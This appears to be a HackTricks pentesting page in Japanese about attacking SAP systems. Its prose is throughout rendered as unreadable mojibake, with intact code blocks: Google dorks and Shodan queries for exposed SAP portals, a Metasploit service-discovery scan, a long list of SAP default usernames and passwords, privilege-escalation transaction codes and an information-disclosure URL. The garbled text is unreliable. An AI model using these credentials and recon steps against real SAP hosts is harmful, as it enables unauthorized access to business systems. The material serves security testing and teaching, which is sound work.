{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


# SAPã«ã¤ã„ã¦ã®ç´¹ä»‹

SAPã¯ã€ãƒ‡ãƒ¼ã‚¿å‡¦ç†ã«ãŠã‘ã‚‹ã‚·ã‚¹ãƒ†ãƒ ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŠã‚ˆã³è£½å“ã‚’æ„å‘³ã—ã¾ã™ã€‚å®šç¾©ä¸Šã€SAPã¯ERPï¼ˆã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºãƒªã‚½ãƒ¼ã‚¹ãƒ—ãƒ©ãƒ³ãƒ‹ãƒ³ã‚°ï¼‰ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®åå‰ã§ã‚‚ã‚ã‚Šã€ä¼šç¤¾ã®åå‰ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚
SAPã‚·ã‚¹ãƒ†ãƒ ã¯ã€ãƒ“ã‚¸ãƒã‚¹ç®¡ç†ã®ã»ã¼ã™ã¹ã¦ã®å´é¢ã‚’ã‚«ãƒãƒ¼ã™ã‚‹å®Œå…¨ã«çµ±åˆã•ã‚ŒãŸãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®æ•°ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ã€‚

å„SAPã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ï¼ˆã¾ãŸã¯SIDï¼‰ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã€ãƒ—ãƒ¬ã‚¼ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®3å±¤ã§æ§‹æˆã•ã‚Œã¦ãŠã‚Šã€å„ãƒ©ãƒ³ãƒ‰ã‚¹ã‚±ãƒ¼ãƒ—ã¯é€šå¸¸ã€é–‹ç™ºã€ãƒ†ã‚¹ãƒˆã€QAã€ãƒ—ãƒ­ãƒ€ã‚¯ã‚·ãƒ§ãƒ³ã®4ã¤ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ã€‚
å„å±¤ã¯ã‚ã‚‹ç¨‹åº¦ã¾ã§æ‚ªç”¨å¯èƒ½ã§ã™ãŒã€æœ€ã‚‚åŠ¹æœçš„ãªã®ã¯**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’æ”»æ’ƒã™ã‚‹ã“ã¨**ã§ã™ã€‚

å„SAPã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«åˆ†ã‹ã‚Œã¦ã„ã¾ã™ã€‚ãã‚Œãã‚Œã«ãƒ¦ãƒ¼ã‚¶ãƒ¼SAP\*ãŒã‚ã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã€Œrootã€ã«ç›¸å½“ã—ã¾ã™ã€‚
åˆæœŸä½œæˆæ™‚ã€ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼SAP\*ã«ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€Œ060719992ã€ãŒè¨­å®šã•ã‚Œã¾ã™ï¼ˆä»¥ä¸‹ã«ä»–ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
ãƒ†ã‚¹ãƒˆã‚„é–‹ç™ºç’°å¢ƒã§ã“ã‚Œã‚‰ã®**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå¤‰æ›´ã•ã‚Œãªã„ã“ã¨ãŒã©ã‚Œã»ã©å¤šã„ã‹**ã‚’çŸ¥ã£ãŸã‚‰é©šãã§ã—ã‚‡ã†ï¼

ä»»æ„ã®ã‚µãƒ¼ãƒãƒ¼ã®ã‚·ã‚§ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å<SID>admã‚’ä½¿ç”¨ã—ã¦ã¿ã¦ãã ã•ã„ã€‚
ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒãŒå½¹ç«‹ã¤å ´åˆãŒã‚ã‚Šã¾ã™ãŒã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒ­ãƒƒã‚¯ã‚¢ã‚¦ãƒˆãƒ¡ã‚«ãƒ‹ã‚ºãƒ ãŒå­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

# ç™ºè¦‹

> æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼shipcod3ã®[https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)ã‹ã‚‰ã®ã‚‚ã®ã§ã™ï¼

* ãƒ†ã‚¹ãƒˆã®ãŸã‚ã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ã‚³ãƒ¼ãƒ—ã¾ãŸã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãƒ–ãƒªãƒ¼ãƒ•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚SAP GUIã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ãƒ›ã‚¹ãƒˆåã‚„ã‚·ã‚¹ãƒ†ãƒ ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
* OSINTï¼ˆã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ã‚¤ãƒ³ãƒ†ãƒªã‚¸ã‚§ãƒ³ã‚¹ï¼‰ã€Shodanã€Google Dorksã‚’ä½¿ç”¨ã—ã¦ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«æ¥ç¶šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ•ã‚¡ã‚¤ãƒ«ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã€é‡è¦ãªæƒ…å ±ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```text
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
```
* ã“ã“ã« [http://SAP:50000/irj/portal](http://sap:50000/irj/portal) ã®å¤–è¦³ãŒã‚ã‚Šã¾ã™

![SAP ãƒ­ã‚°ã‚¤ãƒ³ç”»é¢](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg)

* nmapã‚’ä½¿ç”¨ã—ã¦ã€ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ¼ãƒˆã¨æ—¢çŸ¥ã®ã‚µãƒ¼ãƒ“ã‚¹ï¼ˆsapãƒ«ãƒ¼ã‚¿ãƒ¼ã€webdnyproã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒ“ã‚¹ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãªã©ï¼‰ã‚’ç¢ºèªã—ã¾ã™ã€‚
* ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒç¨¼åƒã—ã¦ã„ã‚‹å ´åˆã¯ã€URLã‚’ã‚¯ãƒ­ãƒ¼ãƒ«ã—ã¾ã™ã€‚
* ç‰¹å®šã®ãƒãƒ¼ãƒˆã«ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒã‚ã‚‹å ´åˆã¯ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ãƒ•ã‚¡ã‚ºã—ã¾ã™ï¼ˆBurp Intruderã‚’ä½¿ç”¨ã§ãã¾ã™ï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®SAP ICMãƒ‘ã‚¹ã‚„ãã®ä»–ã®èˆˆå‘³æ·±ã„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€SecListsãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãŒæä¾›ã™ã‚‹ã„ãã¤ã‹ã®è‰¯ã„ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆãŒã‚ã‚Šã¾ã™ï¼š

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls\_SAP.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt)

* SAPã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹/ã‚µãƒ¼ãƒ“ã‚¹/ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’åˆ—æŒ™ã™ã‚‹ãŸã‚ã«ã€SAP SERVICE DISCOVERYè£œåŠ©Metasploitãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```text
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
## Testing the Thick Client / SAP GUI

SAP GUIã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™
`sapgui <sap server hostname> <system number>`

* ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è³‡æ ¼æƒ…å ±ã‚’ç¢ºèªã™ã‚‹ \(Bugcrowdã®è„†å¼±æ€§è©•ä¾¡åˆ†é¡æ³•ã§ã¯ã€ã“ã‚Œã¯P1 -&gt; ã‚µãƒ¼ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®èª¤è¨­å®š \| ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è³‡æ ¼æƒ…å ±ã®ä½¿ç”¨ \| æœ¬ç•ªã‚µãƒ¼ãƒãƒ¼ã¨è¦‹ãªã•ã‚Œã¾ã™\):
```text
# SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems
#SOLMAN<SID><CLNT>:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
```
* Wiresharkã‚’å®Ÿè¡Œã—ã€å–å¾—ã—ãŸè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼ˆSAP GUIï¼‰ã«èªè¨¼ã—ã¾ã™ã€‚ã„ãã¤ã‹ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯SSLãªã—ã§è³‡æ ¼æƒ…å ±ã‚’é€ä¿¡ã—ã¾ã™ã€‚SAP DIAGãƒ—ãƒ­ãƒˆã‚³ãƒ«ã§ä½¿ç”¨ã•ã‚Œã‚‹ä¸»è¦ãªãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è§£æã§ãã‚‹Wiresharkã®æ—¢çŸ¥ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒ2ã¤ã‚ã‚Šã¾ã™ï¼šSecureAuth Labs SAPè§£æãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨Positive Research Centerã®SAP DIAGãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã€‚
* ä½æ¨©é™ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«ã„ãã¤ã‹ã®SAPãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ï¼ˆtcodesï¼‰ã‚’ä½¿ç”¨ã—ã¦ç‰¹æ¨©æ˜‡æ ¼ã‚’ç¢ºèªã—ã¾ã™ï¼š
* SU01 - ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½œæˆã¨ç®¡ç†
* SU01D - ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è¡¨ç¤º
* SU10 - å¤§é‡ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹
* SU02 - ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã®æ‰‹å‹•ä½œæˆ
* SM19 - ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ» - æ§‹æˆ
* SE84 - SAP R/3èªå¯ã®æƒ…å ±ã‚·ã‚¹ãƒ†ãƒ 
* ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã§ãã‚‹ã‹ç¢ºèªã—ã¾ã™ã€‚
* BAPI Explorerã§XSSãŒã§ãã‚‹ã‹ç¢ºèªã—ã¾ã™ã€‚

# ã‚¦ã‚§ãƒ–ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ãƒ†ã‚¹ãƒˆ

* URLã‚’ã‚¯ãƒ­ãƒ¼ãƒ«ã—ã¾ã™ï¼ˆç™ºè¦‹ãƒ•ã‚§ãƒ¼ã‚ºã‚’å‚ç…§ï¼‰ã€‚
* ç™ºè¦‹ãƒ•ã‚§ãƒ¼ã‚ºã®ã‚ˆã†ã«URLã‚’ãƒ•ã‚¡ã‚ºã—ã¾ã™ã€‚ã“ã“ã«[http://SAP:50000/index.html](http://sap:50000/index.html)ã®å¤–è¦³ãŒã‚ã‚Šã¾ã™ï¼š

![SAP Index Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg)

* ä¸€èˆ¬çš„ãªã‚¦ã‚§ãƒ–è„†å¼±æ€§ã‚’æ¢ã—ã¾ã™ï¼ˆOWASP Top 10ã‚’å‚ç…§ï¼‰ã€‚ã„ãã¤ã‹ã®å ´æ‰€ã«ã¯XSSã€RCEã€XXEãªã©ã®è„†å¼±æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* Jason Haddixã®[ã€ŒThe Bug Hunters Methodologyã€](https://github.com/jhaddix/tbhm)ã‚’å‚ç…§ã—ã¦ã‚¦ã‚§ãƒ–è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚
* å‹•è©æ”¹ã–ã‚“ã«ã‚ˆã‚‹èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ï¼Ÿ ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ :)
* `http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#`ã‚’é–‹ãã€ã€Œé¸æŠã€ãƒœã‚¿ãƒ³ã‚’æŠ¼ã—ã€é–‹ã„ãŸã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã€Œæ¤œç´¢ã€ã‚’æŠ¼ã—ã¾ã™ã€‚SAPãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªã‚¹ãƒˆãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ï¼ˆè„†å¼±æ€§å‚ç…§ï¼š[ERPSCAN-16-010](https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/)ï¼‰
* è³‡æ ¼æƒ…å ±ã¯HTTPçµŒç”±ã§é€ä¿¡ã•ã‚Œã¦ã„ã¾ã™ã‹ï¼Ÿ ãã†ã§ã‚ã‚Œã°ã€Bugcrowdã®[è„†å¼±æ€§è©•ä¾¡åˆ†é¡](https://bugcrowd.com/vulnerability-rating-taxonomy)ã«åŸºã¥ã„ã¦P3ã¨è¦‹ãªã•ã‚Œã¾ã™ï¼šå£Šã‚ŒãŸèªè¨¼ã¨ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç† | HTTPçµŒç”±ã®å¼±ã„ãƒ­ã‚°ã‚¤ãƒ³æ©Ÿèƒ½ã€‚ãƒ’ãƒ³ãƒˆï¼š [http://SAP:50000/startPage](http://sap:50000/startPage)ã‚„ãƒ­ã‚°ã‚¤ãƒ³ãƒãƒ¼ã‚¿ãƒ«ã‚‚ç¢ºèªã—ã¦ãã ã•ã„ :)

![SAP Start Page](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg)

* ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒªã‚¹ãƒˆã‚„èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ã®å¯èƒ½æ€§ã®ãŸã‚ã«`/irj/go/km/navigation/`ã‚’è©¦ã—ã¦ãã ã•ã„ã€‚
* [http://SAP/sap/public/info](http://sap/sap/public/info)ã«ã¯ã„ãã¤ã‹ã®é‡è¦ãªæƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼š
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions">
<RFCSI>
<RFCPROTO>011</RFCPROTO>
<RFCCHARTYP>4102</RFCCHARTYP>
<RFCINTTYP>BIG</RFCINTTYP>
<RFCFLOTYP>IE3</RFCFLOTYP>
<RFCDEST>randomnum</RFCDEST>
<RFCHOST>randomnum</RFCHOST>
<RFCSYSID>BRQ</RFCSYSID>
<RFCDATABS>BRQ</RFCDATABS>
<RFCDBHOST>randomnum</RFCDBHOST>
<RFCDBSYS>ORACLE</RFCDBSYS>
<RFCSAPRL>740</RFCSAPRL>
<RFCMACH>324</RFCMACH>
<RFCOPSYS>AIX</RFCOPSYS>
<RFCTZONE>-25200</RFCTZONE>
<RFCDAYST/>
<RFCIPADDR>192.168.1.8</RFCIPADDR>
<RFCKERNRL>749</RFCKERNRL>
<RFCHOST2>randomnum</RFCHOST2>
<RFCSI_RESV/>
<RFCIPV6ADDR>192.168.1.8</RFCIPV6ADDR>
</RFCSI>
</rfc:RFC_SYSTEM_INFO.Response>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
# è¨­å®šãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

ãƒšãƒ³ãƒ†ã‚¹ãƒˆä¸­ã«æ­£ã—ã„ãƒ­ã‚°ã‚¤ãƒ³æƒ…å ±ãŒã‚ã‚‹å ´åˆã€ã¾ãŸã¯åŸºæœ¬çš„ãªè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦SAP GUIã«ãƒ­ã‚°ã‚¤ãƒ³ã§ããŸå ´åˆã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å€¤ã‚’ç¢ºèªã§ãã¾ã™ã€‚å¤šãã®åŸºæœ¬çš„ãŠã‚ˆã³ã‚«ã‚¹ã‚¿ãƒ è¨­å®šãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å€¤ã¯è„†å¼±æ€§ã¨è¦‹ãªã•ã‚Œã¾ã™ã€‚

æ‰‹å‹•ãŠã‚ˆã³è‡ªå‹•ã®ä¸¡æ–¹ã§ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆä¾‹ï¼š[SAP Parameter Validator](https://github.com/damianStrojek/SAPPV)ï¼‰ã‚’ä½¿ç”¨ã—ã¦ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å€¤ã‚’ç¢ºèªã§ãã¾ã™ã€‚

## æ‰‹å‹•ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒã‚§ãƒƒã‚¯

ãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ `RSPFPAR` ã«ç§»å‹•ã™ã‚‹ã“ã¨ã§ã€ã•ã¾ã–ã¾ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ç…§ä¼šã—ã€ãã®å€¤ã‚’èª¿ã¹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã®è¡¨ã«ã¯ã€å®šç¾©ã•ã‚ŒãŸãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã€ãã‚Œã‚‰ãŒåŒºåˆ¥ã•ã‚Œã‚‹æ¡ä»¶ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ãŸã¨ãˆã°ã€<i>gw/reg_no_conn_info</i> ãŒ 255 æœªæº€ (`<255`) ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãã‚Œã¯è„…å¨ã¨è¦‹ãªã•ã‚Œã‚‹ã¹ãã§ã™ã€‚åŒæ§˜ã«ã€<i>icm/security_log</i> ãŒ 2 (`2`) ã«ç­‰ã—ã„å ´åˆã€ãã‚Œã‚‚å¯èƒ½ãªè„…å¨ã¨ãªã‚Šã¾ã™ã€‚

| ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿                                      | åˆ¶ç´„        | èª¬æ˜                                          |
|------------------------------------------------|-------------|------------------------------------------------|
| `auth/object_disabling_active`                 | `Y`         | ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆç„¡åŠ¹åŒ–ãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã‹ã©ã†ã‹ã‚’ç¤ºã—ã¾ã™ã€‚ |
| `auth/rfc_authority_check`                     | `<2`        | RFC ã®æ¨©é™ãƒã‚§ãƒƒã‚¯ãƒ¬ãƒ™ãƒ«ã‚’è¨­å®šã—ã¾ã™ã€‚       |
| `auth/no_check_in_some_cases`                  | `Y`         | ä¸€éƒ¨ã®ã‚±ãƒ¼ã‚¹ã§ãƒã‚§ãƒƒã‚¯ãŒãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `bdc/bdel_auth_check`                         | `FALSE`     | BDC ã§ã®èªå¯ãƒã‚§ãƒƒã‚¯ãŒå¼·åˆ¶ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’æ±ºå®šã—ã¾ã™ã€‚ |
| `gw/reg_no_conn_info`                         | `<255`      | ç™»éŒ²ç•ªå·æ¥ç¶šæƒ…å ±ã®æ–‡å­—æ•°ã‚’åˆ¶é™ã—ã¾ã™ã€‚       |
| `icm/security_log`                            | `2`         | ICMï¼ˆã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆé€šä¿¡ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ï¼‰ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ­ã‚°ãƒ¬ãƒ™ãƒ«ã‚’å®šç¾©ã—ã¾ã™ã€‚ |
| `icm/server_port_0`                           | `Display`   | ICM ã®ã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ãƒˆï¼ˆãƒãƒ¼ãƒˆ 0ï¼‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `icm/server_port_1`                           | `Display`   | ICM ã®ã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ãƒˆï¼ˆãƒãƒ¼ãƒˆ 1ï¼‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `icm/server_port_2`                           | `Display`   | ICM ã®ã‚µãƒ¼ãƒãƒ¼ãƒãƒ¼ãƒˆï¼ˆãƒãƒ¼ãƒˆ 2ï¼‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `login/password_compliance_to_current_policy`  | `0`         | ç¾åœ¨ã®ãƒãƒªã‚·ãƒ¼ã«å¯¾ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æº–æ‹ ã‚’å¼·åˆ¶ã—ã¾ã™ã€‚ |
